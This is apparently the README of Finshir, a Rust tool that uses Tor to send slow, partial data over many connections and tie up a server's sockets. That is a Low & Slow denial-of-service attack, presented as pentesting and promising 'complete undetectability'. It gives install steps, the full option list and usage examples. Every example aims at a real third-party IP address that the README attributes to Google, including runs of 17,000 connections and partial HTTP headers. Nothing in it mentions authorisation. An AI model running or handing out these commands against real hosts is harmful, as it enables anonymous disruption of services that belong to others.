  You are seeing a high-performant, coroutines-driven, and fully customisable implementation of [Low & Slow](https://www.cloudflare.com/learning/ddos/ddos-low-and-slow-attack/) load generator designed for real-world pentesting. Its complete undetectability is achieved by connecting through [Tor](https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29).

## Features
 - **Coroutines-driven.** Finshir uses [coroutines](https://en.wikipedia.org/wiki/Coroutine) (also called lightweight threads) instead of ordinary threads, which lets you open many more connections with fewer system resources.

 - **Generic.** Unlike other Low & Slow utilities, Finshir lets you transmit arbitrary data sets over the [TCP](https://en.m.wikipedia.org/wiki/Transmission_Control_Protocol) protocol. It may be partial HTTP headers, empty spaces, and so on.
 
 - **Written in Rust.** How you can see, all the logic is written completely in [Rust](https://www.rust-lang.org/), which means that it leverages bare-metal performance and high-level safety (no SIGSEGV, SIGILL, and other "funny" stuff).

----------

## Installation
Currently, this project requires unstable standard library features, so this is why you must switch to the nightly channel to avoid compilation errors:

```
$ rustup override set nightly-2019-04-25
```

### Building from crates.io
```bash
$ cargo install finshir
```

### Building from sources
```bash
$ git clone https://github.com/Gymmasssorla/finshir.git
$ cd finshir
$ cargo build --release
```

### Pre-compiled binaries
The easiest way to run Finshir on your system is to download the pre-compiled binaries from the [existing releases](https://github.com/Gymmasssorla/finshir/releases), which doesn't require any external software (unlike the two previous approaches).

----------

## Options
```
finshir 0.1.0
Temirkhan Myrzamadi <gymmasssorla@gmail.com>
A coroutines-driven Low & Slow traffic sender, written in Rust

USAGE:
    finshir [FLAGS] [OPTIONS] --receiver <SOCKET-ADDRESS>

FLAGS:
    -h, --help       Prints help information
        --use-tor    Torify all sockets by connecting to a SOCKS5 proxy running
                     on 127.0.0.1:9050
    -V, --version    Prints version information

OPTIONS:
        --connect-timeout <TIME-SPAN>
            If a timeout is reached and a socket wasn't connected, the program
            will retry the operation later.
            
            Note that this option currently doesn't work on sockets which are
            trying to connect through Tor. [default: 30secs]
    -c, --connections <POSITIVE-INTEGER>
            A number of connections the program will handle simultaneously. This
            option also equals to a number of coroutines [default: 1000]
        --date-time-format <STRING>
            A format for displaying local date and time in log messages. Type
            `man strftime` to see the format specification [default: %X]
        --failed-count <POSITIVE-INTEGER>
            A number of failed data transmissions used to reconnect a socket to
            a remote web server [default: 5]
        --ip-ttl <UNSIGNED-INTEGER>
            Specifies the IP_TTL value for all future sockets. Usually this
            value equals a number of routers that a packet can go through
    -f, --portions-file <LOCATION>
            A file which consists of a custom JSON array of data portions,
            specified as strings.
            
            When a coroutine finished sending all portions, it reconnects its
            socket and starts sending them again.
    -r, --receiver <SOCKET-ADDRESS>
            A receiver of generator traffic, specified as an IP address and a
            port number, separated by a colon
    -d, --test-duration <TIME-SPAN>
            A whole test duration, after which all spawned coroutines will stop
            their work [default: 64years 64hours 64secs]
    -v, --verbosity <LEVEL>
            Enable one of the possible verbosity levels. The zero level doesn't
            print anything, and the last level prints everything [default: 3]
            [possible values: 0, 1, 2, 3, 4, 5]
    -w, --wait <TIME-SPAN>
            A waiting time span before test execution used to prevent a launch
            of an erroneous (unwanted) test [default: 5secs]
        --write-periodicity <TIME-SPAN>
            A time interval between writing data portions. This option can be
            used to modify test intensity [default: 30secs]
        --write-timeout <TIME-SPAN>
            If a timeout is reached and a data portion wasn't sent, the program
            will retry the operation later [default: 30secs]

By default, Finshir generates 100 empty spaces as data portions. If you want to
override this behaviour, consider using the `--portions-file` option.

----------

## Overview

### Minimal command
The following command spawns 1000 coroutines, each trying to establish a new TCP connection. When connections are established, it sends empty spaces every 30 seconds, thereby order a server to wait as long as it can:

```bash
# Specify one of the Google's IP addresses as a target web server
$ finshir --receiver=64.233.165.113:80
```

### Using the Tor network
You can do this by specifying the `--use-tor` flag. It connects to your local SOCKS5 proxy running on 9050 port, which is typically used by Tor proxies. Also consider modifying the default configuration file located in `/etc/tor/torrc`.

```bash
# Connect to the Google's address through your local Tor proxy
$ finshir --receiver=64.233.165.113:80 --use-tor
```

### Test intensity
Low & Slow techniques assume to be VERY SLOW, which means that you typically send a couple of bytes every N seconds. For instance, Finshir uses the 30 seconds interval by default, but it's modifiable as well:

```bash
# Test the Google's server sending data portions every one minute
$ finshir --receiver=64.233.165.113:80 --write-periodicity=1min
```

### Connections count
The default number of parallel connections is 1000. However, you can modify this limit using the `--connections` option, but be sure that you system is able to handle such amount of file descriptors:

```bash
# Modify the default limit of file descriptors to 17015
$ sudo ulimit -n 17015

# Test the target server using 17000 parallel TCP connections
$ finshir --receiver=64.233.165.113:80 --connections=17000
```

### Custom data portions
By default, Finshir generates 100 empty spaces as data portions to send. You can override this behaviour by specifying your custom messages as a file, consisting of a single JSON array. This example is focused on Google:

```bash
# Send partial HTTP headers to Google using `--portions-file`
$ finshir --receiver=64.233.165.113:80 --portions-file files/google.json
```

### Logging options
Consider specifying a custom verbosity level from 0 to 5 (inclusively), which is done by the `--verbosity` option. There is also the `--date-time-format` option which tells Finshir to use your custom date-time format.

```bash
# Use a custom date-time format and the last verbosity level
$ finshir --receiver=64.233.165.113:80 --date-time-format="%F" --verbosity=5
```
